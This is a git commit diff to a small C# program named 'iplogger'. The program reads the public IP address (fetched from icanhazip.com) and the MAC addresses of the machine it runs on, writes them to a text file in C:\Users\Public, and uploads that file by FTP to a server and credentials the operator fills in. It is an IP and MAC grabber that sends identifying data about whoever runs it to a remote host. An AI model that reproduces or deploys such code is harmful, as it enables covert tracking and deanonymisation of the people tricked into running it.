2ff61394b69487dbdca1afa3cb25b2d944ad16e6
NullByte75 <66488397+NullByte75@users.noreply.github.com>
2020-07-15 12:05:42 +0200

    Update Program.cs

--- Program.cs
+++ Program.cs
@@ -1,5 +1,8 @@
-﻿using System.IO;
+using System;
+using System.IO;
+using System.Linq;
 using System.Net;
+using System.Net.NetworkInformation;
 
 namespace iplogger
 {
@@ -7,14 +10,19 @@ namespace iplogger
     {
         public static void Main(string[] args)
         {
-            string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
-            using (StreamWriter writetext = new StreamWriter("C:\\Users\\Public\\ip.txt")) //saves into C:\Users\Public\ the txt file
+            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
             {
-                writetext.WriteLine(publicip);
+                var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a string
+                string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
+                using (StreamWriter writetext = new StreamWriter("C:\\Users\\Public\\ip.txt")) //saves into C:\Users\Public\ the txt file
+                {
+                    writetext.WriteLine(publicip);
+                    writetext.WriteLine(mac);
+                }
+                WebClient client = new WebClient();
+                client.Credentials = new NetworkCredential("user", "password"); //change "user" with the username of the ftp and "password" with your ftp password
+                client.UploadFile("ftp://example:22", @"C:\Users\Public\ip.txt"); //change example with the ip or hostname of your server
             }
-            WebClient client = new WebClient();
-            client.Credentials = new NetworkCredential("user", "password"); //change "user" with the username of the ftp and "password" with your ftp password
-            client.UploadFile("ftp://example:22", @"C:\Users\Public\ip.txt"); //change ftp://example:22 with the ip or hostname of your server
         }
     }
 }
